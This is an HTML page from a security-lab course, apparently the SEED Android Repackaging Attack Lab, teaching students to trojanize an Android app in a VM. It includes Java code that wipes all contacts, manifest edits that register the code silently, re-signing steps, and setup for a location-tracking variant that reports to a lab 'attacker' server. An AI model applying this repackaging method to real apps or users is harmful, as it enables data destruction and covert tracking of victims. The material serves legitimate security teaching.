@@ -1,0 +1,712 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  
+  <title>Android Repackaging Attack Lab &mdash; Network Security Lab  documentation</title>
+  
+
+  
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
+
+  
+  
+
+  
+  
+
+  
+
+  
+  <!--[if lt IE 9]>
+    <script src="../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+        <script src="../../_static/jquery.js"></script>
+        <script src="../../_static/underscore.js"></script>
+        <script src="../../_static/doctools.js"></script>
+    
+    <script type="text/javascript" src="../../_static/js/theme.js"></script>
+
+    
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Android Device Rooting Lab" href="rooting.html" />
+    <link rel="prev" title="Clickjacking Attack Lab" href="click_jacking.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="../../index.html" class="icon icon-home"> Network Security Lab
+          
+
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../xie/xie_labs.html">Xie Labs</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../seed_index.html">SEED Labs</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../crypto/crypto_index.html">Cryptography Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../hardware/hardware_index.html">Hardware Labs</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="mobile_index.html">Mobile Security Labs</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="click_jacking.html">Clickjacking Attack Lab</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">Android Repackaging Attack Lab</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#overview">Overview</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-1-obtain-an-android-app-apk-file-and-install-it">Task 1: Obtain An Android App (APK file) and Install It</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-2-disassemble-android-app">Task 2: Disassemble Android App</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-3-inject-malicious-code">Task 3: Inject Malicious Code</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-4-repack-android-app-with-malicious-code">Task 4: Repack Android App with Malicious Code</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-5-install-the-repackaged-app-and-trigger-the-malicious-code">Task 5: Install the Repackaged App and Trigger the Malicious Code</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#task-6-using-repackaging-attack-to-track-victims-location">Task 6: Using Repackaging Attack to Track Victim’s Location</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#submission-and-demonstration">Submission and Demonstration</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="rooting.html">Android Device Rooting Lab</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../network/network_index.html">Network Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../web/web_index.html">Web Security Labs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../software/software_index.html">Software Security Labs</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../website_link/web_index.html"><strong>Return To Website</strong></a></li>
+</ul>
+
+            
+          
+        </div>
+        
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Network Security Lab</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../../index.html" class="icon icon-home"></a> &raquo;</li>
+        
+          <li><a href="../seed_index.html">SEED Labs</a> &raquo;</li>
+        
+          <li><a href="mobile_index.html">Mobile Security Labs</a> &raquo;</li>
+        
+      <li>Android Repackaging Attack Lab</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="center docutils container">
+<p>Android Repackaging Attack Lab</p>
+</div>
+<div class="section" id="android-repackaging-attack-lab">
+<h1>Android Repackaging Attack Lab<a class="headerlink" href="#android-repackaging-attack-lab" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="overview">
+<h2>Overview<a class="headerlink" href="#overview" title="Permalink to this headline">¶</a></h2>
+<p>Repackaging attack is a very common type of attacks on Android devices.
+In such an attack, attackers modify a popular app downloaded from app
+markets, reverse engineer the app, add some malicious payloads, and then
+upload the modified app to app markets. Users can be easily fooled,
+because it is hard to notice the difference between the modified app and
+the original app. Once the modified apps are installed, the malicious
+code inside can conduct attacks, usually in the background. For example,
+in March 2011, it was found that DroidDream Trojan had been embedded
+into more than 50 apps in Android official market and had infected many
+users. DroidDream Trojan exploits vulnerabilities in Android to gain the
+root access on the device.</p>
+<p>The learning objective of this lab is for students to gain a first-hand
+experience in Android repackaging attack, so they can better understand
+this particular risk associated with Android systems, and be more
+cautious when downloading apps to their devices, especially from those
+untrusted third-party markets. In this lab, students will be asked to
+conduct a simple repackaging attack on a selected app, and demonstrate
+the attack only on our provided Android VM. Students should be warned
+not to submit their repackaged apps to any market, or they will face
+legal consequence. Nor should they run the attack on their own Android
+devices, as that may cause real damages.</p>
+<p>What makes repackaging attack easy is that Android apps’ binary code can
+be easily reverse engineered, due to the lack of protection on binaries.
+The left part of <strong>Figure 1</strong> depicts the
+typical development process of Android apps, which produces a file
+called APK file. This file is uploaded to app markets for others to
+download. The right part of the figure shows that once attackers get the
+APK file, they can use reverse engineering tools to unpack the APK file,
+disassemble the program, add malicious logic, and then package
+everything back to APK file (modified) again. Attackers then upload the
+repackaged app to app markets, most of which do not have countermeasures
+to detect whether an app is repackaged or not.</p>
+<div class="center docutils container">
+<div class="align-center figure align-default" id="id1">
+<img alt="alternate text" src="../../_images/RepackagingAttackOverview.jpg" />
+<p class="caption"><span class="caption-text">Figure 1: Overview of the Repackaging attack</span><a class="headerlink" href="#id1" title="Permalink to this image">¶</a></p>
+</div>
+</div>
+<div class="section" id="lab-environment">
+<h3>Lab Environment.<a class="headerlink" href="#lab-environment" title="Permalink to this headline">¶</a></h3>
+<p>The lab requires two virtual machines, one is called <code class="docutils literal notranslate"><span class="pre">SEEDAndroid</span></code>,
+and the other is called <code class="docutils literal notranslate"><span class="pre">SEEDUbuntu16.04</span></code>. As the name indicates, the
+first VM is a virtual machine running Android operating system, and we
+need it to test our repackaging attack. The second VM is a Ubuntu Linux
+virtual machine; all the tools needed for this lab have already been
+installed on this Ubuntu VM. Both VMs and their user manuals can be
+downloaded from the SEED web site. These two VMs need to be connected to
+the same network (we can attach the same <code class="docutils literal notranslate"><span class="pre">&quot;Nat</span> <span class="pre">Network&quot;</span></code> adaptor to
+both VMs).</p>
+</div>
+</div>
+<div class="section" id="task-1-obtain-an-android-app-apk-file-and-install-it">
+<h2>Task 1: Obtain An Android App (APK file) and Install It<a class="headerlink" href="#task-1-obtain-an-android-app-apk-file-and-install-it" title="Permalink to this headline">¶</a></h2>
+<p>To launch the repackaging attack, we need a host app. In real attacks,
+attackers usually choose popular apps, because they can get more people
+to download their repackaged apps. For this task, you can write your own
+app or download an existing app. You can get APK files for Android
+applications from many places, such as this web site:
+<a class="reference external" href="https://apkpure.com/">https://apkpure.com/</a>. We also provide a simple app for you to download
+(the file name is <code class="docutils literal notranslate"><span class="pre">RepackagingLab.apk</span></code>).</p>
+<p>It should be noted that we are using an Android VM in this lab, not a
+physical Android device, so some apps may not run on the VM (they will
+crash). One of the possible reasons for crashing is that the application
+may have native code. Native code compiled for a real Android device has
+binary code for ARM processors, while our Android VM runs on x86
+processors. To get these apps to run in our Android VM, the native code
+needs to be recompiled for x86 processors. That requires source code,
+which is hard to get. Therefore, if you have encountered this problem,
+just find another app. This limitation is only caused by the lab
+environment; it is not an issue for the attacks in the real world.</p>
+<p>Let us first install the host app. We will do it using the <code class="docutils literal notranslate"><span class="pre">adb</span></code> tool
+from the Ubuntu VM. First, we need to find the IP address of the Android
+VM. This can be achieved by running the <code class="docutils literal notranslate"><span class="pre">ifconfig</span></code> command in the
+Android Terminal app. We then run the following commands to install the
+app.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>// Connect to the Android VM using adb
+$ adb connect &lt;ip_address_of_android_vm&gt;
+
+// Install the app
+$ adb install &lt;application_name&gt;.apk
+</pre></div>
+</div>
+</div>
+<div class="section" id="task-2-disassemble-android-app">
+<h2>Task 2: Disassemble Android App<a class="headerlink" href="#task-2-disassemble-android-app" title="Permalink to this headline">¶</a></h2>
+<p>To launch the repackaging attack on an app, we need to modify the app.
+Although we can directly modify the APK file, it is not easy, because
+the code in the APK file contains Dalvik bytecode (dex format), which is
+not meant for human to read. We need to convert the bytecode into
+something that is human readable. The most common human readable format
+for Dalvik bytecode is known as Smali. The names “Smali” and “Baksmali”
+are the Icelandic equivalents of “assembler” and “disassembler”,
+respectively.</p>
+<p>In this task, we will use a tool called <code class="docutils literal notranslate"><span class="pre">APKTool</span></code> to disassemble dex
+code (<code class="docutils literal notranslate"><span class="pre">classes.dex</span></code>) to smali code. <code class="docutils literal notranslate"><span class="pre">APKTool</span></code> is a very powerful
+reverse engineering tool for Android apps. It is useful to decode and
+rebuild Android apps. We can feed the entire APK file to the tool like
+the following:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>[backgroundcolor=]
+  $ apktool d [appname].apk
+</pre></div>
+</div>
+<p>APK file is just a zip file, which contains <code class="docutils literal notranslate"><span class="pre">classes.dex</span></code> (compiled
+java source code, called Dalvik bytecode), <code class="docutils literal notranslate"><span class="pre">resources.arsc</span></code> (resource
+files), <code class="docutils literal notranslate"><span class="pre">AndroidManifest.xml</span></code>, etc. <code class="docutils literal notranslate"><span class="pre">APKTool</span></code> basically unzips the
+APK file, and decode its contents. For the resource files, not much
+needs to be done. For the Dalvik bytecode <code class="docutils literal notranslate"><span class="pre">classes.dex</span></code>, it is
+disassembled into smali code, <code class="docutils literal notranslate"><span class="pre">APKTool</span></code> places the output files into a
+created folder with a name that is the same as the name of the APK file.
+The typical folder structure of APK file after disassembly is shown in
+<strong>Figure 2</strong>. The folder contains
+<code class="docutils literal notranslate"><span class="pre">XML</span></code> resource files, <code class="docutils literal notranslate"><span class="pre">AndroidManifest</span></code> file, source code files,
+etc. The <code class="docutils literal notranslate"><span class="pre">XML</span></code> resources and <code class="docutils literal notranslate"><span class="pre">AndroidManifest</span></code> files should be
+readable and usually very close to their original forms. The
+disassembled smali code is placed in the smali folder. Typically, one
+smali file contains the code for one Java class.</p>
+<div class="align-center figure align-default" id="id2">
+<img alt="APK file structure after running ``APKTool``" src="../../_images/ApkFileStructure.jpg" />
+<p class="caption"><span class="caption-text">Figure 2: APK file structure after running <code class="docutils literal notranslate"><span class="pre">APKTool</span></code></span><a class="headerlink" href="#id2" title="Permalink to this image">¶</a></p>
+</div>
+<p>What we will do next is to inject some malicious code into the smali
+folder, and then assemble everything together into a new APK package.
+That is why it is called Repackaging attack.</p>
+</div>
+<div class="section" id="task-3-inject-malicious-code">
+<h2>Task 3: Inject Malicious Code<a class="headerlink" href="#task-3-inject-malicious-code" title="Permalink to this headline">¶</a></h2>
+<p>In this task, we will inject malicious code into the target app’s smali
+code. There are many ways to do that. One approach is to directly modify
+some existing smali file, so we can add malicious logic into it. Another
+approach, which is much easier, is to add a completely new component to
+the app; this new component is independent from the existing app, so it
+does not affect the app’s behavior. Since each independent component can
+be placed in a separate smali file, using this approach, we just need to
+create a new smali file.</p>
+<p>There are four types of components in Android apps, <em>activity</em>,
+<em>service</em>, <em>broadcast receiver</em>, and <em>content provider</em>. The first two
+components are most commonly used by apps, while the other two are not
+as common. We can add any of these components in the target app, but the
+most important problem for the attack is to find a way to trigger the
+malicious code without being noticed by users. Although solutions to the
+problem exist for all these components, the easiest one is broadcast
+receiver, which can be triggered by broadcasts sent by the system. For
+example, when the system time is set, a <code class="docutils literal notranslate"><span class="pre">TIME_SET</span></code> broadcast will be
+sent out; after the system reboots, a <code class="docutils literal notranslate"><span class="pre">BOOT_COMPLETED</span></code> broadcast will
+be sent out. We can write a broadcast receiver that listens to one of
+these broadcasts, so the malicious code will be automatically triggered
+by those events.</p>
+<p>Writing a broadcast receiver in Android is quite straightforward. If you
+know how to do that, feel free to write your own code. After you have
+built an APK file from your own Java code, you should run <code class="docutils literal notranslate"><span class="pre">APKTool</span></code> to
+disassemble your APK file and obtain the smali code for your broadcast
+receiver. For those who have not taken any Android programming course,
+you can use our provided smali code. The Java code is described in the
+following, while the smali code can be downloaded from the web site of
+this lab.</p>
+<div class="highlight-java notranslate"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MaliciousCode</span> <span class="kd">extends</span> <span class="n">BroadcastReceiver</span> <span class="p">{</span>
+  <span class="nd">@Override</span>
+  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="p">(</span><span class="n">Context</span> <span class="n">context</span><span class="p">,</span> <span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
+     <span class="n">ContentResolver</span> <span class="n">contentResolver</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="na">getContentResolver</span><span class="p">();</span>
+     <span class="n">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">contentResolver</span><span class="p">.</span><span class="na">query</span>
+              <span class="p">(</span><span class="n">ContactsContract</span><span class="p">.</span><span class="na">Contacts</span><span class="p">.</span><span class="na">CONTENT_URI</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+
+     <span class="k">while</span> <span class="p">(</span><span class="n">cursor</span><span class="p">.</span><span class="na">moveToNext</span><span class="p">())</span> <span class="p">{</span>
+         <span class="n">String</span> <span class="n">lookupKey</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="na">getString</span>
+              <span class="p">(</span><span class="n">cursor</span><span class="p">.</span><span class="na">getColumnIndex</span><span class="p">(</span><span class="n">ContactsContract</span><span class="p">.</span><span class="na">Contacts</span><span class="p">.</span><span class="na">LOOKUP_KEY</span><span class="p">));</span>
+
+         <span class="n">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">Uri</span><span class="p">.</span><span class="na">withAppendedPath</span>
+               <span class="p">(</span><span class="n">ContactsContract</span><span class="p">.</span><span class="na">Contacts</span><span class="p">.</span><span class="na">CONTENT_LOOKUP_URI</span><span class="p">,</span> <span class="n">lookupKey</span><span class="p">);</span>
+         <span class="n">contentResolver</span><span class="p">.</span><span class="na">delete</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="kc">null</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+     <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>The above malicious code, if triggered, will delete all the contact
+records from the device. The code implements a broadcast receiver, which
+will be triggered by a broadcast event. Once it is triggered, it enters
+the <code class="docutils literal notranslate"><span class="pre">onReceive()</span></code> method, and this is where we implement our malicious
+logic. The code above basically interacts with the <code class="docutils literal notranslate"><span class="pre">Contacts</span></code> app’s
+content provider, and asks the content provider to remove all its
+entries, essentially wiping out all the contact records. In the code, a
+<code class="docutils literal notranslate"><span class="pre">ContentResolver</span></code> is used to access the contacts stored on the phone.
+In order to get the list of contacts, a query is sent to <code class="docutils literal notranslate"><span class="pre">Contacts</span></code>’
+content provider. This query does not provide any matching criterion, so
+all the records are returned via a <code class="docutils literal notranslate"><span class="pre">Cursor</span></code> object. The code then go
+through all these records and delete them one by one.</p>
+<p>You can download the smali code of the above program from our web site,
+and place it in the <code class="docutils literal notranslate"><span class="pre">smali/com</span></code> folder that is created by <code class="docutils literal notranslate"><span class="pre">APKTool</span></code>.
+However, we are not done yet, because we have not tell the system when
+to invoke our broadcast receiver. We have to register our broadcast
+receiver to the system. This is done by adding some information to the
+target app’s <code class="docutils literal notranslate"><span class="pre">AndroidManifest.xml</span></code> file, which can also be found from
+the folder created by <code class="docutils literal notranslate"><span class="pre">APKTool</span></code>. Moreover, in order to read from and
+write to <code class="docutils literal notranslate"><span class="pre">Contacts</span></code>’ content provider, an app needs to declare two
+corresponding permissions in <code class="docutils literal notranslate"><span class="pre">AndroidManifest.xml</span></code>. The following
+shows what needs to be added to the manifest file.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;manifest...&gt;
+  ...
+  &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot; /&gt;  (*@\ding{192}@*)
+  &lt;uses-permission android:name=&quot;android.permission.WRITE_CONTACTS&quot; /&gt; (*@\ding{193}@*)
+  ....
+
+  &lt;application&gt;
+      .....
+      .....
+      &lt;receiver android:name=&quot;com.MaliciousCode&quot; &gt;
+          &lt;intent-filter&gt;
+             &lt;action android:name=&quot;android.intent.action.TIME_SET&quot; /&gt;  (*@\ding{194}@*)
+          &lt;/intent-filter&gt;
+      &lt;/receiver&gt;
+  &lt;/application&gt;
+
+&lt;/manifest&gt;
+</pre></div>
+</div>
+<p>In the above manifest file, we add two permissions to allow the app to
+read from and write to <code class="docutils literal notranslate"><span class="pre">Contacts</span></code>’ content provider (Lines  and ).
+It should be noted that these permissions are added outside of the
+<code class="docutils literal notranslate"><span class="pre">&lt;application&gt;</span></code> block, but within the <code class="docutils literal notranslate"><span class="pre">&lt;manifest&gt;</span></code> block. In the
+file, we also register our broadcast receiver to the <code class="docutils literal notranslate"><span class="pre">TIME_SET</span></code>
+broadcast event (Line ), so our code can be triggered every time we
+change the time on the phone. The registration should be added inside
+the <code class="docutils literal notranslate"><span class="pre">&lt;application&gt;</span></code> block, not inside the <code class="docutils literal notranslate"><span class="pre">&lt;activity&gt;</span></code> block. The
+application that you downloaded from app markets may have a large
+<code class="docutils literal notranslate"><span class="pre">AndroidManifest.xml</span></code> file; you should carefully modify the file and
+place the injected contents in the right place.</p>
+</div>
+<div class="section" id="task-4-repack-android-app-with-malicious-code">
+<h2>Task 4: Repack Android App with Malicious Code<a class="headerlink" href="#task-4-repack-android-app-with-malicious-code" title="Permalink to this headline">¶</a></h2>
+<p>After we have inserted your own malicious smali code, we are ready to
+reassemble everything together, and build a single APK file. The process
+takes two steps.</p>
+<div class="section" id="step-1-rebuild-apk">
+<h3>Step 1: Rebuild APK<a class="headerlink" href="#step-1-rebuild-apk" title="Permalink to this headline">¶</a></h3>
+<p>We use <code class="docutils literal notranslate"><span class="pre">APKTool</span></code> again to generate a new APK file. The command is
+shown in the following. By default, the new APK file will be saved in
+the <code class="docutils literal notranslate"><span class="pre">“dist”</span></code> directory.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>[backgroundcolor=]
+  $ apktool b [application_folder]
+</pre></div>
+</div>
+</div>
+<div class="section" id="step-2-sign-the-apk-file">
+<h3>Step 2: Sign the APK file<a class="headerlink" href="#step-2-sign-the-apk-file" title="Permalink to this headline">¶</a></h3>
+<p>Android requires all apps to be digitally signed before they can be
+installed. This requires each APK to have a digital signature and a
+public key certificate. The certificate and the signature helps Android
+to identify the author of an app. From the security perspective, the
+certificate needs to be signed by a certificate authority, who, before
+signing, needs to verify that the identify stored inside the certificate
+is indeed authentic. Getting a certificate from an accepted certificate
+authority is usually not free, so Android allows developers to sign
+their certificates using their own private key, i.e., the certificate is
+self signed. The purpose of such self-signed certificates is meant for
+apps to be able to run on Android devices, not for security. Developers
+can put any name they want in the certificate, regardless of whether the
+name is legally owned by others or not, because no certificate authority
+is involved to check that. Obviously, this entirely defeats the purpose
+of certificate and signature. Google Play Store does some name
+verification before accepting an app, but other third-party app markets
+do not always conduct such a verification. In this lab, we will just use
+a self-signed certificate. The entire process consists of two steps.</p>
+<ol class="arabic">
+<li><p>Step 1: Generate a public and private key pair using the <code class="docutils literal notranslate"><span class="pre">keytool</span></code>
+command:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>[backgroundcolor=]
+  $ keytool -alias &lt;alias_name&gt; -genkey -v -keystore mykey.keystore
+</pre></div>
+</div>
+<p>The tool will prompt users for a password, which is used to protect
+the keystore; it also asks users to provide some additional
+information for the key. It then generates a public/private key pair,
+and store that in a keystore file <code class="docutils literal notranslate"><span class="pre">mykey.keystore</span></code> (specified at
+the command line). The keystore can store multiple keys, each
+identified by an alias name (specified in the command), which is the
+name that we will use later when signing your app.</p>
+</li>
+<li><p>Step 2: We can now use <code class="docutils literal notranslate"><span class="pre">jarsigner</span></code> to sign the APK file using the
+key generated in the previous step. We can do it using the following
+command.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>[backgroundcolor=]
+  $ jarsigner -keystore mykey.keystore app_name.apk &lt;alias_name&gt;
+</pre></div>
+</div>
+<p>The command <code class="docutils literal notranslate"><span class="pre">jarsigner</span></code> prompts the user to enter the password,
+which is needed for accessing the keystore. It then use the key
+(identified by the alias name) to sign the APK file.</p>
+</li>
+</ol>
+</div>
+</div>
+<div class="section" id="task-5-install-the-repackaged-app-and-trigger-the-malicious-code">
+<h2>Task 5: Install the Repackaged App and Trigger the Malicious Code<a class="headerlink" href="#task-5-install-the-repackaged-app-and-trigger-the-malicious-code" title="Permalink to this headline">¶</a></h2>
+<p>In this final step, we will install the modified app on our Android VM,
+and test whether the attack is successful or not. If we have already
+installed the app before, we need to go to Android VM and uninstall the
+app first; otherwise, we will not be able to install the repackaged app,
+because of the signature mismatch. The instructions for installation are
+the same as those in Task 1.</p>
+<p>Before demonstrating the attack, we need to give our application
+permission to access contacts. In a real world scenario, applications
+usually ask users for permission. Permissions for photos, contacts,
+location etc. are very commonly asked for.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>[backgroundcolor=]
+  Settings -&gt; Apps -&gt; Repackaging Lab -&gt; Permissions -&gt; toggle contacts on
+</pre></div>
+</div>
+<p>To demonstrate whether the attack works, we just need to run the
+application once, add a few contacts in the <code class="docutils literal notranslate"><span class="pre">Contacts</span></code> app and change
+the time on the android VM. If your attack is successful, you should see
+that all the contact records that you just entered are deleted. To
+change the time, do the following:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>[backgroundcolor=]
+  Settings -&gt; Date and Time -&gt; Set time
+</pre></div>
+</div>
+<div class="section" id="common-problems">
+<h3>Common problems.<a class="headerlink" href="#common-problems" title="Permalink to this headline">¶</a></h3>
+<p>We need to run the installed repackaged application once to register the
+receiver. Otherwise, the injected code will not be executed.</p>
+</div>
+</div>
+<div class="section" id="task-6-using-repackaging-attack-to-track-victims-location">
+<h2>Task 6: Using Repackaging Attack to Track Victim’s Location<a class="headerlink" href="#task-6-using-repackaging-attack-to-track-victims-location" title="Permalink to this headline">¶</a></h2>
+<p>In this task, we will perform another repackaging attack where the
+malicious code will steal the location information from a user’s phone,
+essentially tracking the user’s movement.</p>
+<div class="section" id="step-1-setting-up-mock-locations">
+<h3>Step 1. Setting up mock locations.<a class="headerlink" href="#step-1-setting-up-mock-locations" title="Permalink to this headline">¶</a></h3>
+<p>On an Android device, we can get the location information from its GPS
+hardware. However, our Android VM does not have such hardware, but
+Android OS does allow us to provide mock locations to applications. All
+we need to do is to write a mock location app, and then configure the
+Android OS to get locations from this app, instead of a real GPS
+hardware. We have already installed such an app in the Android VM. This
+app can simulate location traces in six different cities. Simply select
+a city from the app.</p>
+</div>
+<div class="section" id="step-2-configuring-dns">
+<h3>Step 2: Configuring DNS.<a class="headerlink" href="#step-2-configuring-dns" title="Permalink to this headline">¶</a></h3>
+<p>The malicious code in the repackaged app will send out the victim’s
+coordinates to the attacker’s server at
+<a class="reference external" href="www.repackagingattacklab.com">www.repackagingattacklab.com</a>. We are
+going to use the SEEDUbuntu VM to host this server. Therefore, we need
+to map the hostname to the Ubuntu VM’s IP address. The easiest way to
+set this up is to add a line to the file on the Android VM. We can use a
+text editor tool (such as <code class="docutils literal notranslate"><span class="pre">vi</span></code> or some editor app) to directly modify
+the file on Android.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>// Run the following commands on the Android VM
+$ su root
+# vi /system/etc/hosts
+
+  Add the following entry to the end of hosts
+  (*@\textbf{IP\_Address  www.repackagingattacklab.com}@*)
+
+  where IP_Address is the IP address of the Ubuntu VM
+</pre></div>
+</div>
+<p>If you are not familiar with the editing tool on Android, you can copy
+the file to the Ubuntu VM, makes changes in Ubuntu, and then copy the
+file back to Android. The following commands are for this latter
+approach.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>// Run the following commands on the Ubuntu VM
+// Assume Android VM&#39;s IP is: 10.0.2.9
+
+// Get the Ubuntu VM&#39;s IP address
+$ ifconfig
+
+// Start the adb daemon with root privilege
+$ adb root
+
+// Connect to the Android VM
+$ adb connect 10.0.2.9
+
+// Download the hosts file from the Android VM
+$ adb pull /system/etc/hosts
+
+// Modify the downloaded hosts file on Ubuntu VM
+$ gedit ./hosts  (or use your own favorite text editor)
+
+  Add the following entry to the end of hosts
+  IP_Address  www.repackagingattacklab.com
+
+  where IP_Address is the IP address of the Ubuntu VM
+
+// Upload the hosts file back to the Android VM
+$ adb push ./hosts /system/etc/hosts
+</pre></div>
+</div>
+</div>
+<div class="section" id="step-3-repackaging-and-installing-the-victim-app">
+<h3>Step 3: Repackaging and installing the victim app.<a class="headerlink" href="#step-3-repackaging-and-installing-the-victim-app" title="Permalink to this headline">¶</a></h3>
+<p>We will follow the instructions in Tasks 1 to 5 to conduct the
+repackaging. We will even use the same host app. The only difference is
+that we are going to use a new set of smali code, which can be
+downloaded from our website. There are three smali files:
+<code class="docutils literal notranslate"><span class="pre">MaliciousCode.smali</span></code>, <code class="docutils literal notranslate"><span class="pre">SendData$1.smali</span></code>, and <code class="docutils literal notranslate"><span class="pre">SendData.smali</span></code>.
+Place them in the folder of the unpacked application.</p>
+<p>We also have to modify the <code class="docutils literal notranslate"><span class="pre">AndroidManifest.xml</span></code>, because the
+malicious code requires different permissions than the one used in Tasks
+1 to 5. We need three permissions related to location and one for
+Internet access.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;manifest...&gt;
+  ...
+  &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot;/&gt;
+  &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot;/&gt;
+  &lt;uses-permission android:name=&quot;android.permission.ACCESS_MOCK_LOCATION&quot; /&gt;
+  &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;
+  ....
+
+  &lt;application&gt;
+      .....
+      .....
+      &lt;receiver android:name=&quot;com.mobiseed.repackaging.MaliciousCode&quot; &gt;
+          &lt;intent-filter&gt;
+              &lt;action android:name=&quot;android.intent.action.TIME_SET&quot; /&gt;
+          &lt;/intent-filter&gt;
+      &lt;/receiver&gt;
+  &lt;/application&gt;
+
+&lt;/manifest&gt;
+</pre></div>
+</div>
+</div>
+<div class="section" id="step-4-enabling-the-permission-on-the-android-vm">
+<h3>Step 4: Enabling the permission on the Android VM.<a class="headerlink" href="#step-4-enabling-the-permission-on-the-android-vm" title="Permalink to this headline">¶</a></h3>
+<p>Adding location permissions to the manifest file is not enough. When an
+app is installed via a store app, such as the Play store, users will be
+asked whether they will grant those location permissions to the app. If
+users approve, the Play store will tell the system that the permissions
+are granted. Since we install our app via the <code class="docutils literal notranslate"><span class="pre">adb</span></code> tool, which does
+not prompt us for approvals; nor will it automatically enable these
+permissions for the app. Therefore, we have to do it manually. Follow
+the steps below to allow location access. It should be noted that on a
+real phone, users do not need to perform this step manually.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>[backgroundcolor=]
+  Settings -&gt; Apps -&gt; Repackaging Lab -&gt; Permissions -&gt; toggle location on
+</pre></div>
+</div>
+</div>
+<div class="section" id="step-5-triggering-the-attacking-code">
+<h3>Step 5: Triggering the attacking code.<a class="headerlink" href="#step-5-triggering-the-attacking-code" title="Permalink to this headline">¶</a></h3>
+<p>Now we are ready to see the attack work. Run the mock location
+application and choose a location, then change the time on your Android
+VM. To change time, click the following sequence:</p>
